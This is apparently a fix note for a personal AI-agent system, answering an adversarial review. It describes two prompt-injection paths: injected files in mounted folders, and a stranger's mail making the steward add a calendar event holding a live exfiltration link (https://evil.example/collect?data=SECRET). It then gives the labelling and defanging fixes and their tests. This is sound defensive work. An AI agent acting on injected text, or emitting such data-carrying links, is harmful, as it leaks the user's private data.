# R1: fixes from Codex's adversarial review, round 1

Codex's first round found two in-scope defects. Both let a stranger's
text put a live link holding Kira's data in front of her, against I5
and the threat model's line on links that carry data out.

## Shell results from mounted folders

A file in a mounted folder can be a stranger's: a download, a cloned
repository, a saved mail. The `sh` tool labelled its output `private`
only and gave it no sources. So a steward that read an injected file
could tell Kira about a live link, and a skill the file shaped was not
flagged.

- A `:house :mounts` entry is a path, or `{:path "..." :trusted true}`.
  A plain path counts as untrusted (the orchestrator's conservative
  choice, which Kira may loosen). `:trusted false` is allowed and means
  the same as a plain path.
- relay cannot tell which files a command read. So while any untrusted
  folder is mounted, every `sh` result is labelled `contaminated` and
  carries one source per untrusted folder, `files:<folder name>`. With
  only trusted mounts a result is `private` with no source, as before.
  `relay.shell/provenance` is the pure function that decides this.
- The source label is the folder's last path segment in lower case,
  with any character outside agentloop's label charset turned into a
  hyphen, because a label cannot hold upper case or spaces. Kira sees it
  as "your files in downloads". Two folders with the same last name share
  a source. That only changes the wording Kira sees; the label still marks
  the result as outside text.
- Scratch is still not a source of its own, as before. Its labels still
  carry over.
- `relay house status` marks trusted folders "(trusted)". `relay init`'s
  template, `setup/relay.example.edn`, the README (the shell section and
  Upgrading), `docs/house-shell.md` and the spec's StewardShell invariant
  describe the new form.

Tests: properties `a-result-is-outside-text-exactly-when-an-untrusted-folder-is-mounted`
and the updated no-network property over mixed mount forms; settings
checks for the map form; an end-to-end test with the stand-in runner in
which an injected file in an untrusted folder leads to a message with
the link broken and "Drew on: your files in notes", and a flagged skill
change; tilde expansion for `:path`. Pentest `s18-shell-walls` now runs
the same chain in a real container and checks `relay ready`, the
phone pushes and `relay changes`.

## Links in the calendar feed

The feed escaped iCalendar syntax and dropped hidden characters, but it
ignored event labels. A mail could have the steward add an event whose
description held `https://evil.example/collect?data=SECRET`, and that
link would be live in Kira's calendar app.

- `core/calendar-feed` now carries each event's labels. A new version
  already keeps the labels of the version it changes, so the latest
  version's labels are enough.
- `relay.ics/field-text` strips hidden characters first, then, when the
  labels hold `contaminated` or any source label, runs `text/defang` on
  the title, location and description before escaping and folding. That
  is the same order messages use, so a hidden character cannot split a
  link where defang would miss it. A clean event's text is unchanged.

Tests: property `an-outside-events-text-holds-no-live-link-and-a-clean-ones-is-unchanged`
over generated events with links and hidden characters, a unit test of
every field, and an end-to-end feed test in `calendar_test`. Pentest
`s26-calendar-feed` adds an event from a session holding a stranger's
mail and checks that the served feed has no live link in any field.
